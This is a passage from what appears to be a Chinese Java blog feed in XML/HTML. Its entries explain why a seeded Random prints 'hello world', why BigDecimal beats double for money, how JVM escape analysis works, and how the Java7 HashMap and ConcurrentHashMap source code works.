        <content type="html"><![CDATA[<p>下面是一段随机数程序。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;System.out.println(randomString(-229985452) + &quot; &quot; + randomString(-147909649));&#125;public static String randomString(int seed) &#123;Random ran &#x3D; new Random(seed);StringBuilder sb &#x3D; new StringBuilder();while (true) &#123;int k &#x3D; ran.nextInt(27);if (k &#x3D;&#x3D; 0) &#123;break;&#125;sb.append((char) (&#39;&#96;&#39; + k));&#125;return sb.toString();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>每次都会输出：hello world，这是为什么呢？？</strong></p><p>Random构造函数，参数seed是初始种子，相同的种子每次产生的随机数都一样，所以无论怎么随机，构造出来的随机数都一样。</p><p><strong>Random r &#x3D; new Random(-229985452)</strong></p><p>会产生以下5位不为0的随机数：</p><pre class="line-numbers language-none"><code class="language-none">85121215<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Random r &#x3D; new Random(-147909649)</strong></p><p>会产生以下5位不为0的随机数：</p><pre class="line-numbers language-none"><code class="language-none">231518124<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序里面用`符号相加，`代表96.</p><p>所以，有下面的结果：</p><pre class="line-numbers language-none"><code class="language-none">8  + 96 &#x3D; 104 --&gt; h5  + 96 &#x3D; 101 --&gt; e12 + 96 &#x3D; 108 --&gt; l12 + 96 &#x3D; 108 --&gt; l15 + 96 &#x3D; 111 --&gt; o23 + 96 &#x3D; 119 --&gt; w15 + 96 &#x3D; 111 --&gt; o18 + 96 &#x3D; 114 --&gt; r12 + 96 &#x3D; 108 --&gt; l4  + 96 &#x3D; 100 --&gt; d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一段很简单的程序却如此神奇，分享给别人，看他知道不？</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>金融系统中正确的金额计算及存储方式</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/%E9%87%91%E8%9E%8D%E7%B3%BB%E7%BB%9F%E4%B8%AD%E6%AD%A3%E7%A1%AE%E7%9A%84%E9%87%91%E9%A2%9D%E8%AE%A1%E7%AE%97%E5%8F%8A%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/%E9%87%91%E8%9E%8D%E7%B3%BB%E7%BB%9F%E4%B8%AD%E6%AD%A3%E7%A1%AE%E7%9A%84%E9%87%91%E9%A2%9D%E8%AE%A1%E7%AE%97%E5%8F%8A%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="经典的精度丢失问题"><a href="#经典的精度丢失问题" class="headerlink" title="经典的精度丢失问题"></a>经典的精度丢失问题</h4><p> Java中的类型float、double用来做计算会有精度丢失问题，下面来看下面的示例。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;test1();test2();&#125;private static void test1() &#123;double totalAmount &#x3D; 0.09;double feeAmount &#x3D; 0.02;double tradeAmount &#x3D; totalAmount - feeAmount;System.out.println(tradeAmount);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的程序输出结果是多少？</p><p>0.07？非也！</p><p>正确的结果是：</p><pre class="line-numbers language-none"><code class="language-none">0.06999999999999999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为什么是这样？</p><p>浮点数可能丢失精度，浮点十进制数通常没有完全相同的二进制的表示形式，这是CPU所采用的浮点数据表示形式的副作用。为此，可能会有一些精度丢失，并且一些浮点运算可能会产生未知的结果。</p><p>浮点运算很少是精确的，只要是超过精度能表示的范围就会产生误差。所以，在使用float、double作精确运算的时候一定要特别小心，除非能容忍精度丢失，不然产生的误差也是会造成双方对账不一致的结果。</p><h4 id="怎么解决"><a href="#怎么解决" class="headerlink" title="怎么解决"></a>怎么解决</h4><blockquote><p>在《Effective Java》这本书中也提到这个原则，float和double只能用来做科学计算或者是工程计算，在商业计算中我们要用 java.math.BigDecimal。</p></blockquote><p>BigDecimal适合更精度的运算，也提供了丰富的操作符类型，小数位控制，四舍五入规则等。</p><p>不过，使用BigDecimal不当也有精度丢失的情况，如double的构造方法：</p><pre class="line-numbers language-none"><code class="language-none">BigDecimal(double val)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再来看这个示例：</p><pre class="line-numbers language-none"><code class="language-none">private static void test2() &#123;double totalAmount &#x3D; 0.09;double feeAmount &#x3D; 0.02;BigDecimal tradeAmount &#x3D; new BigDecimal(totalAmount).subtract(new BigDecimal(feeAmount));System.out.println(tradeAmount);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-none"><code class="language-none">0.0699999999999999962529972918900966760702431201934814453125<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个精度就更恐怖了。。</p><p>所以，一定要使用String的构造方法：</p><pre class="line-numbers language-none"><code class="language-none">BigDecimal(String val)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">private static void test3() &#123;double totalAmount &#x3D; 0.09;double feeAmount &#x3D; 0.02;BigDecimal tradeAmount &#x3D; new BigDecimal(String.valueOf(totalAmount)).subtract(new BigDecimal(String.valueOf(feeAmount)));System.out.println(tradeAmount);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol><li><p>金额运算尽量使用BigDecimal(String val)进行运算。</p></li><li><p>数据库存储金额，一般有整型和浮点型两种存储方式。如果是有汇率转换的，建议使用浮点数decimal进行存储，可以灵活的控制精度，decimal直接对应java类型BigDecimal。当然，用整数存储分这种形式也可以，转账的时候单位为元而如果忘了转换分为元，那就悲剧了。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试问我 Java 逃逸分析，瞬间被秒杀了。</title>
      <link href="/2025/10/15/%E8%BF%9B%E9%98%B6/%E9%9D%A2%E8%AF%95%E9%97%AE%E6%88%91%20Java%20%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90%EF%BC%8C%E7%9E%AC%E9%97%B4%E8%A2%AB%E7%A7%92%E6%9D%80%E4%BA%86%E3%80%82/"/>
      <url>/2025/10/15/%E8%BF%9B%E9%98%B6/%E9%9D%A2%E8%AF%95%E9%97%AE%E6%88%91%20Java%20%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90%EF%BC%8C%E7%9E%AC%E9%97%B4%E8%A2%AB%E7%A7%92%E6%9D%80%E4%BA%86%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p>记得几年前有一次栈长去面试，问到了这么一个问题:</p><blockquote><p>Java中的对象都是在堆中分配吗？说明为什么！</p></blockquote><p>当时我被问得一脸蒙逼，瞬间被秒杀得体无完肤，当时我压根就不知道他在考什么知识点，难道对象不是在堆中分配吗？最后就没然后了，回去等通知了。。</p><p>这个面试题很经典，我最近也分享到了知识星球上面：</p><p><img src="http://img.javastack.cn/20190527134034.png"></p><p>回答很精彩，大家可以加入一起搞技术，我现在将答案总结一下给大家。</p><h2 id="什么是逃逸分析？"><a href="#什么是逃逸分析？" class="headerlink" title="什么是逃逸分析？"></a>什么是逃逸分析？</h2><p>关于 Java 逃逸分析的定义：</p><p>逃逸分析（Escape Analysis）简单来讲就是，Java Hotspot 虚拟机可以分析新创建对象的使用范围，并决定是否在 Java 堆上分配内存的一项技术。</p><p>逃逸分析的 JVM 参数如下：</p><ul><li>开启逃逸分析：-XX:+DoEscapeAnalysis</li><li>关闭逃逸分析：-XX:-DoEscapeAnalysis</li><li>显示分析结果：-XX:+PrintEscapeAnalysis</li></ul><p>逃逸分析技术在 Java SE 6u23+ 开始支持，并默认设置为启用状态，可以不用额外加这个参数。</p><h2 id="逃逸分析算法"><a href="#逃逸分析算法" class="headerlink" title="逃逸分析算法"></a>逃逸分析算法</h2><p>Java Hotspot 编译器实现下面论文中描述的逃逸算法：</p><pre class="line-numbers language-none"><code class="language-none">[Choi99] Jong-Deok Choi, Manish Gupta, Mauricio Seffano,          Vugranam C. Sreedhar, Sam Midkiff,          &quot;Escape Analysis for Java&quot;, Procedings of ACM SIGPLAN          OOPSLA  Conference, November 1, 1999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>根据 Jong-Deok Choi, Manish Gupta, Mauricio Seffano,Vugranam C. Sreedhar, Sam Midkiff 等大牛在论文《<strong>Escape Analysis for Java</strong>》中描述的算法进行逃逸分析的。</p><p>该算法引入了连通图，用连通图来构建对象和对象引用之间的可达性关系，并在次基础上，提出一种组合数据流分析法。</p><p>由于算法是上下文相关和流敏感的，并且模拟了对象任意层次的嵌套关系，所以分析精度较高，只是运行时间和内存消耗相对较大。 </p><h2 id="对象逃逸状态"><a href="#对象逃逸状态" class="headerlink" title="对象逃逸状态"></a>对象逃逸状态</h2><p>我们了解了 Java 中的逃逸分析技术，再来了解下一个对象的逃逸状态。</p><h4 id="1、全局逃逸（GlobalEscape）"><a href="#1、全局逃逸（GlobalEscape）" class="headerlink" title="1、全局逃逸（GlobalEscape）"></a>1、全局逃逸（GlobalEscape）</h4><p>即一个对象的作用范围逃出了当前方法或者当前线程，有以下几种场景：</p><ul><li>对象是一个静态变量</li><li>对象是一个已经发生逃逸的对象</li><li>对象作为当前方法的返回值</li></ul><h4 id="2、参数逃逸（ArgEscape）"><a href="#2、参数逃逸（ArgEscape）" class="headerlink" title="2、参数逃逸（ArgEscape）"></a>2、参数逃逸（ArgEscape）</h4><p>即一个对象被作为方法参数传递或者被参数引用，但在调用过程中不会发生全局逃逸，这个状态是通过被调方法的字节码确定的。</p><h4 id="3、没有逃逸"><a href="#3、没有逃逸" class="headerlink" title="3、没有逃逸"></a>3、没有逃逸</h4><p>即方法中的对象没有发生逃逸。</p><h2 id="逃逸分析优化"><a href="#逃逸分析优化" class="headerlink" title="逃逸分析优化"></a>逃逸分析优化</h2><p>针对上面第三点，当一个对象没有逃逸时，可以得到以下几个虚拟机的优化。</p><p><strong>1) 锁消除</strong></p><p>我们知道线程同步锁是非常牺牲性能的，当编译器确定当前对象只有当前线程使用，那么就会移除该对象的同步锁。</p><p>例如，StringBuffer 和 Vector 都是用 synchronized 修饰线程安全的，但大部分情况下，它们都只是在当前线程中用到，这样编译器就会优化移除掉这些锁操作。</p><p>锁消除的 JVM 参数如下：</p><ul><li>开启锁消除：-XX:+EliminateLocks</li><li>关闭锁消除：-XX:-EliminateLocks</li></ul><p>锁消除在 JDK8 中都是默认开启的，并且锁消除都要建立在逃逸分析的基础上。</p><p><strong>2) 标量替换</strong></p><p>首先要明白标量和聚合量，基础类型和对象的引用可以理解为标量，它们不能被进一步分解。而能被进一步分解的量就是聚合量，比如：对象。</p><p>对象是聚合量，它又可以被进一步分解成标量，将其成员变量分解为分散的变量，这就叫做标量替换。</p><p>这样，如果一个对象没有发生逃逸，那压根就不用创建它，只会在栈或者寄存器上创建它用到的成员标量，节省了内存空间，也提升了应用程序性能。</p><p>标量替换的 JVM 参数如下：</p><ul><li>开启标量替换：-XX:+EliminateAllocations</li><li>关闭标量替换：-XX:-EliminateAllocations</li><li>显示标量替换详情：-XX:+PrintEliminateAllocations</li></ul><p>标量替换同样在 JDK8 中都是默认开启的，并且都要建立在逃逸分析的基础上。</p><p><strong>3) 栈上分配</strong></p><p>当对象没有发生逃逸时，该对象就可以通过标量替换分解成成员标量分配在栈内存中，和方法的生命周期一致，随着栈帧出栈时销毁，减少了 GC 压力，提高了应用程序性能。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>逃逸分析讲完了，总结了不少时间，我们也应该大概知道逃逸分析是为了优化 JVM 内存和提升程序性能的。</p><p>我们知道这点后，在平时开发过程中就要可尽可能的控制变量的作用范围了，变量范围越小越好，让虚拟机尽可能有优化的空间。</p><p>简单举一个例子吧，如：</p><pre class="line-numbers language-none"><code class="language-none">return sb;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以改为：</p><pre class="line-numbers language-none"><code class="language-none">return sb.toString();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是一种优化案例，把 StringBuilder 变量控制在了当前方法之内，没有逃出当前方法作用域。</p><p>大家还有没有别的优化经验，欢迎分享~</p><p>参考资料：</p><ul><li><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/vm/performance-enhancements-7.html#escapeAnalysis">https://docs.oracle.com/javase/8/docs/technotes/guides/vm/performance-enhancements-7.html#escapeAnalysis</a></p></li><li><p><a href="https://blog.csdn.net/rickiyeat/article/details/76802085">https://blog.csdn.net/rickiyeat/article/details/76802085</a></p></li><li><p><a href="https://blog.csdn.net/baichoufei90/article/details/85180478">https://blog.csdn.net/baichoufei90/article/details/85180478</a></p></li><li><p>你真的搞懂 transient 关键字了吗？</p></li><li><p>面试常考：Synchronized 有几种用法？</p></li><li><p>Java 11 已发布，String 还能这样玩！</p></li><li><p>Java 中的 String 真的是不可变吗？</p></li><li><p>sleep( ) 和 wait( ) 的这 5 个区别</p></li><li><p>……</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashMap, ConcurrentHashMap 原理及源码</title>
      <link href="/2025/10/15/%E9%9B%86%E5%90%88/HashMap,%20ConcurrentHashMap%20%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BA%90%E7%A0%81/"/>
      <url>/2025/10/15/%E9%9B%86%E5%90%88/HashMap,%20ConcurrentHashMap%20%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BA%90%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>网上关于 HashMap 和 ConcurrentHashMap 的文章确实不少，不过缺斤少两的文章比较多，所以才想自己也写一篇，把细节说清楚说透，尤其像 Java8 中的 ConcurrentHashMap，大部分文章都说不清楚。终归是希望能降低大家学习的成本，不希望大家到处找各种不是很靠谱的文章，看完一篇又一篇，可是还是模模糊糊。</p><p><strong>阅读建议：</strong> 四节基本上可以进行独立阅读，建议初学者可按照以下顺序进行阅读，可适当降低阅读门槛。</p><blockquote><p>Java7 HashMap -&gt; Java7 ConcurrentHashMap -&gt; Java8 HashMap -&gt; Java8 ConcurrentHashMap </p></blockquote><p><strong>阅读前提：</strong> 本文分析的是源码，所以至少读者要熟悉它们的接口使用，同时，对于并发，读者至少要知道 CAS、ReentrantLock、UNSAFE 操作这几个基本的知识，文中不会对这些知识进行介绍。Java8 用到了红黑树，不过本文不会进行展开，感兴趣的读者请自行查找相关资料。</p><h2 id="Java7-HashMap"><a href="#Java7-HashMap" class="headerlink" title="Java7 HashMap"></a>Java7 HashMap</h2><p>HashMap 是最简单的，一来我们非常熟悉，二来就是它不支持并发操作，所以源码也非常简单。</p><p>首先，我们用下面这张图来介绍 HashMap 的结构。</p><p><img src="http://qianniu.javastack.cn/18-12-4/65827660.jpg"></p><p>这个仅仅是示意图，因为没有考虑到数组要扩容的情况，具体的后面再说。</p><p>大方向上，HashMap 里面是一个<strong>数组</strong>，然后数组中每个元素是一个<strong>单向链表</strong>。</p><p>上图中，每个绿色的实体是嵌套类 Entry 的实例，Entry 包含四个属性：key, value, hash 值和用于单向链表的 next。</p><p>capacity：当前数组容量，始终保持 2^n，可以扩容，扩容后数组大小为当前的 2 倍。</p><p>loadFactor：负载因子，默认为 0.75。</p><p>threshold：扩容的阈值，等于 capacity * loadFactor</p><h4 id="put-过程分析"><a href="#put-过程分析" class="headerlink" title="put 过程分析"></a>put 过程分析</h4><p>还是比较简单的，跟着代码走一遍吧。</p><pre class="line-numbers language-none"><code class="language-none">public V put(K key, V value) &#123;    &#x2F;&#x2F; 当插入第一个元素的时候，需要先初始化数组大小    if (table &#x3D;&#x3D; EMPTY_TABLE) &#123;        inflateTable(threshold);    &#125;    &#x2F;&#x2F; 如果 key 为 null，感兴趣的可以往里看，最终会将这个 entry 放到 table[0] 中    if (key &#x3D;&#x3D; null)        return putForNullKey(value);    &#x2F;&#x2F; 1. 求 key 的 hash 值    int hash &#x3D; hash(key);    &#x2F;&#x2F; 2. 找到对应的数组下标    int i &#x3D; indexFor(hash, table.length);    &#x2F;&#x2F; 3. 遍历一下对应下标处的链表，看是否有重复的 key 已经存在，    &#x2F;&#x2F;    如果有，直接覆盖，put 方法返回旧值就结束了    for (Entry&lt;K,V&gt; e &#x3D; table[i]; e !&#x3D; null; e &#x3D; e.next) &#123;        Object k;        if (e.hash &#x3D;&#x3D; hash &amp;&amp; ((k &#x3D; e.key) &#x3D;&#x3D; key || key.equals(k))) &#123;            V oldValue &#x3D; e.value;            e.value &#x3D; value;            e.recordAccess(this);            return oldValue;        &#125;    &#125;     modCount++;    &#x2F;&#x2F; 4. 不存在重复的 key，将此 entry 添加到链表中，细节后面说    addEntry(hash, key, value, i);    return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="数组初始化"><a href="#数组初始化" class="headerlink" title="数组初始化"></a>数组初始化</h6><p>在第一个元素插入 HashMap 的时候做一次数组的初始化，就是先确定初始的数组大小，并计算数组扩容的阈值。</p><pre class="line-numbers language-none"><code class="language-none">private void inflateTable(int toSize) &#123;    &#x2F;&#x2F; 保证数组大小一定是 2 的 n 次方。    &#x2F;&#x2F; 比如这样初始化：new HashMap(20)，那么处理成初始数组大小是 32    int capacity &#x3D; roundUpToPowerOf2(toSize);    &#x2F;&#x2F; 计算扩容阈值：capacity * loadFactor    threshold &#x3D; (int) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + 1);    &#x2F;&#x2F; 算是初始化数组吧    table &#x3D; new Entry[capacity];    initHashSeedAsNeeded(capacity); &#x2F;&#x2F;ignore&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有一个将数组大小保持为 2 的 n 次方的做法，Java7 和 Java8 的 HashMap 和 ConcurrentHashMap 都有相应的要求，只不过实现的代码稍微有些不同，后面再看到的时候就知道了。</p><h6 id="计算具体数组位置"><a href="#计算具体数组位置" class="headerlink" title="计算具体数组位置"></a>计算具体数组位置</h6><p>这个简单，我们自己也能 YY 一个：使用 key 的 hash 值对数组长度进行取模就可以了。</p><pre class="line-numbers language-none"><code class="language-none">static int indexFor(int hash, int length) &#123;    &#x2F;&#x2F; assert Integer.bitCount(length) &#x3D;&#x3D; 1 : &quot;length must be a non-zero power of 2&quot;;    return hash &amp; (length-1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法很简单，简单说就是取 hash 值的低 n 位。如在数组长度为 32 的时候，其实取的就是 key 的 hash 值的低 5 位，作为它在数组中的下标位置。</p><h6 id="添加节点到链表中"><a href="#添加节点到链表中" class="headerlink" title="添加节点到链表中"></a>添加节点到链表中</h6><p>找到数组下标后，会先进行 key 判重，如果没有重复，就准备将新值放入到链表的表头。</p><pre class="line-numbers language-none"><code class="language-none">void addEntry(int hash, K key, V value, int bucketIndex) &#123;    &#x2F;&#x2F; 如果当前 HashMap 大小已经达到了阈值，并且新值要插入的数组位置已经有元素了，那么要扩容    if ((size &gt;&#x3D; threshold) &amp;&amp; (null !&#x3D; table[bucketIndex])) &#123;        &#x2F;&#x2F; 扩容，后面会介绍一下        resize(2 * table.length);        &#x2F;&#x2F; 扩容以后，重新计算 hash 值        hash &#x3D; (null !&#x3D; key) ? hash(key) : 0;        &#x2F;&#x2F; 重新计算扩容后的新的下标        bucketIndex &#x3D; indexFor(hash, table.length);    &#125;    &#x2F;&#x2F; 往下看    createEntry(hash, key, value, bucketIndex);&#125;&#x2F;&#x2F; 这个很简单，其实就是将新值放到链表的表头，然后 size++void createEntry(int hash, K key, V value, int bucketIndex) &#123;    Entry&lt;K,V&gt; e &#x3D; table[bucketIndex];    table[bucketIndex] &#x3D; new Entry&lt;&gt;(hash, key, value, e);    size++;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个方法的主要逻辑就是先判断是否需要扩容，需要的话先扩容，然后再将这个新的数据插入到扩容后的数组的相应位置处的链表的表头。</p><h6 id="数组扩容"><a href="#数组扩容" class="headerlink" title="数组扩容"></a>数组扩容</h6><p>前面我们看到，在插入新值的时候，如果当前的 size 已经达到了阈值，并且要插入的数组位置上已经有元素，那么就会触发扩容，扩容后，数组大小为原来的 2 倍。</p><pre class="line-numbers language-none"><code class="language-none">void resize(int newCapacity) &#123;    Entry[] oldTable &#x3D; table;    int oldCapacity &#x3D; oldTable.length;    if (oldCapacity &#x3D;&#x3D; MAXIMUM_CAPACITY) &#123;        threshold &#x3D; Integer.MAX_VALUE;        return;    &#125;    &#x2F;&#x2F; 新的数组    Entry[] newTable &#x3D; new Entry[newCapacity];    &#x2F;&#x2F; 将原来数组中的值迁移到新的更大的数组中    transfer(newTable, initHashSeedAsNeeded(newCapacity));    table &#x3D; newTable;    threshold &#x3D; (int)Math.min(newCapacity * loadFactor, MAXIMUM_CAPACITY + 1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>扩容就是用一个新的大数组替换原来的小数组，并将原来数组中的值迁移到新的数组中。</p><p>由于是双倍扩容，迁移过程中，会将原来 table[i] 中的链表的所有节点，分拆到新的数组的 newTable[i] 和 newTable[i + oldLength] 位置上。如原来数组长度是 16，那么扩容后，原来 table[0] 处的链表中的所有元素会被分配到新数组中 newTable[0] 和 newTable[16] 这两个位置。代码比较简单，这里就不展开了。</p><h4 id="get-过程分析"><a href="#get-过程分析" class="headerlink" title="get 过程分析"></a>get 过程分析</h4><p>相对于 put 过程，get 过程是非常简单的。</p><ol><li>根据 key 计算 hash 值。</li><li>找到相应的数组下标：hash &amp; (length – 1)。</li><li>遍历该数组位置处的链表，直到找到相等(&#x3D;&#x3D;或equals)的 key。</li></ol><pre class="line-numbers language-none"><code class="language-none">public V get(Object key) &#123;    &#x2F;&#x2F; 之前说过，key 为 null 的话，会被放到 table[0]，所以只要遍历下 table[0] 处的链表就可以了    if (key &#x3D;&#x3D; null)        return getForNullKey();    &#x2F;&#x2F;     Entry&lt;K,V&gt; entry &#x3D; getEntry(key);     return null &#x3D;&#x3D; entry ? null : entry.getValue();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>getEntry(key):</p><pre class="line-numbers language-none"><code class="language-none">final Entry&lt;K,V&gt; getEntry(Object key) &#123;    if (size &#x3D;&#x3D; 0) &#123;        return null;    &#125;     int hash &#x3D; (key &#x3D;&#x3D; null) ? 0 : hash(key);    &#x2F;&#x2F; 确定数组下标，然后从头开始遍历链表，直到找到为止    for (Entry&lt;K,V&gt; e &#x3D; table[indexFor(hash, table.length)];         e !&#x3D; null;         e &#x3D; e.next) &#123;        Object k;        if (e.hash &#x3D;&#x3D; hash &amp;&amp;            ((k &#x3D; e.key) &#x3D;&#x3D; key || (key !&#x3D; null &amp;&amp; key.equals(k))))            return e;    &#125;    return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Java7-ConcurrentHashMap"><a href="#Java7-ConcurrentHashMap" class="headerlink" title="Java7 ConcurrentHashMap"></a>Java7 ConcurrentHashMap</h2><p>ConcurrentHashMap 和 HashMap 思路是差不多的，但是因为它支持并发操作，所以要复杂一些。</p><p>整个 ConcurrentHashMap 由一个个 Segment 组成，Segment 代表”部分“或”一段“的意思，所以很多地方都会将其描述为<strong>分段锁</strong>。注意，行文中，我很多地方用了 <strong>“槽”</strong> 来代表一个 segment。</p><p>简单理解就是，ConcurrentHashMap 是一个 Segment 数组，Segment 通过继承 ReentrantLock 来进行加锁，所以每次需要加锁的操作锁住的是一个 segment，这样只要保证每个 Segment 是线程安全的，也就实现了全局的线程安全。推荐阅读：<a href="https://mp.weixin.qq.com/s/0CI9od4DIxRrmOGFJw0SuQ">史上最全 Java 多线程面试题及答案</a>。</p><p><img src="http://qianniu.javastack.cn/18-12-4/75121838.jpg"></p><p><strong>concurrencyLevel：</strong> 并行级别、并发数、Segment 数，怎么翻译不重要，理解它。默认是 16，也就是说 ConcurrentHashMap 有 16 个 Segments，所以理论上，这个时候，最多可以同时支持 16 个线程并发写，只要它们的操作分别分布在不同的 Segment 上。这个值可以在初始化的时候设置为其他值，但是一旦初始化以后，它是不可以扩容的。</p><p>再具体到每个 Segment 内部，其实每个 Segment 很像之前介绍的 HashMap，不过它要保证线程安全，所以处理起来要麻烦些。推荐阅读：<a href="https://mp.weixin.qq.com/s/5Y5_6qn2g6kIVmQia_0R6g">几种线程安全的Map解析</a>。</p><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>initialCapacity：初始容量，这个值指的是整个 ConcurrentHashMap 的初始容量，实际操作的时候需要平均分给每个 Segment。</p><p>loadFactor：负载因子，之前我们说了，Segment 数组不可以扩容，所以这个负载因子是给每个 Segment 内部使用的。</p><pre class="line-numbers language-none"><code class="language-none">public ConcurrentHashMap(int initialCapacity,                         float loadFactor, int concurrencyLevel) &#123;    if (!(loadFactor &gt; 0) || initialCapacity &lt; 0 || concurrencyLevel &lt;&#x3D; 0)        throw new IllegalArgumentException();    if (concurrencyLevel &gt; MAX_SEGMENTS)        concurrencyLevel &#x3D; MAX_SEGMENTS;    &#x2F;&#x2F; Find power-of-two sizes best matching arguments    int sshift &#x3D; 0;    int ssize &#x3D; 1;    &#x2F;&#x2F; 计算并行级别 ssize，因为要保持并行级别是 2 的 n 次方    while (ssize &lt; concurrencyLevel) &#123;        ++sshift;        ssize &lt;&lt;&#x3D; 1;    &#125;    &#x2F;&#x2F; 我们这里先不要那么烧脑，用默认值，concurrencyLevel 为 16，sshift 为 4    &#x2F;&#x2F; 那么计算出 segmentShift 为 28，segmentMask 为 15，后面会用到这两个值    this.segmentShift &#x3D; 32 - sshift;    this.segmentMask &#x3D; ssize - 1;     if (initialCapacity &gt; MAXIMUM_CAPACITY)        initialCapacity &#x3D; MAXIMUM_CAPACITY;     &#x2F;&#x2F; initialCapacity 是设置整个 map 初始的大小，    &#x2F;&#x2F; 这里根据 initialCapacity 计算 Segment 数组中每个位置可以分到的大小    &#x2F;&#x2F; 如 initialCapacity 为 64，那么每个 Segment 或称之为&quot;槽&quot;可以分到 4 个    int c &#x3D; initialCapacity &#x2F; ssize;    if (c * ssize &lt; initialCapacity)        ++c;    &#x2F;&#x2F; 默认 MIN_SEGMENT_TABLE_CAPACITY 是 2，这个值也是有讲究的，因为这样的话，对于具体的槽上，    &#x2F;&#x2F; 插入一个元素不至于扩容，插入第二个的时候才会扩容    int cap &#x3D; MIN_SEGMENT_TABLE_CAPACITY;     while (cap &lt; c)        cap &lt;&lt;&#x3D; 1;     &#x2F;&#x2F; 创建 Segment 数组，    &#x2F;&#x2F; 并创建数组的第一个元素 segment[0]    Segment&lt;K,V&gt; s0 &#x3D;        new Segment&lt;K,V&gt;(loadFactor, (int)(cap * loadFactor),                         (HashEntry&lt;K,V&gt;[])new HashEntry[cap]);    Segment&lt;K,V&gt;[] ss &#x3D; (Segment&lt;K,V&gt;[])new Segment[ssize];    &#x2F;&#x2F; 往数组写入 segment[0]    UNSAFE.putOrderedObject(ss, SBASE, s0); &#x2F;&#x2F; ordered write of segments[0]    this.segments &#x3D; ss;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>初始化完成，我们得到了一个 Segment 数组。</p><p>我们就当是用 new ConcurrentHashMap() 无参构造函数进行初始化的，那么初始化完成后：</p><ul><li>Segment 数组长度为 16，不可以扩容</li><li>Segment[i] 的默认大小为 2，负载因子是 0.75，得出初始阈值为 1.5，也就是以后插入第一个元素不会触发扩容，插入第二个会进行第一次扩容</li><li>这里初始化了 segment[0]，其他位置还是 null，至于为什么要初始化 segment[0]，后面的代码会介绍</li><li>当前 